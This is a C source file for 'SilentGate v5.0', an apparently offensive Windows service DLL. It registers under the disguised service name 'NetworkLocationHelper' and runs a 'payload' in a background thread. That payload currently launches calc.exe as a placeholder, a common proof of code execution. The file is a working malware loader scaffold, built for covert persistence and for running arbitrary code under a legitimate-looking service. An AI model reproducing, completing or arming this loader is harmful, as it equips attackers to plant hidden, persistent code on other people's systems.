/*
 * SilentGate v5.0 - Service DLL with Payload Execution
 * Fixed: proper CRT linking + worker thread before ServiceMain returns
 * Author: JarDani
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsvc.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>

static SERVICE_STATUS        g_status = {0};
static SERVICE_STATUS_HANDLE g_handle = NULL;

static VOID WINAPI sg_control(DWORD ctrl) {
    if (ctrl == SERVICE_CONTROL_STOP) {
        g_status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_handle, &g_status);
    }
}

static DWORD WINAPI sg_payload_thread(LPVOID param) {
    /* Small delay to ensure service is fully running */
    Sleep(1000);

    /* Simple test - open calc */
    WinExec("calc.exe", SW_SHOW);

    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    g_handle = RegisterServiceCtrlHandlerA("NetworkLocationHelper", sg_control);
    if (!g_handle) return;

    g_status.dwServiceType      = SERVICE_WIN32_SHARE_PROCESS;
    g_status.dwCurrentState     = SERVICE_RUNNING;
    g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_handle, &g_status);

    /* Run payload in background thread */
    HANDLE t = CreateThread(NULL, 0, sg_payload_thread, NULL, 0, NULL);
    if (t) {
        WaitForSingleObject(t, 30000);
        CloseHandle(t);
    }

    g_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_handle, &g_status);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(h);
    return TRUE;
}
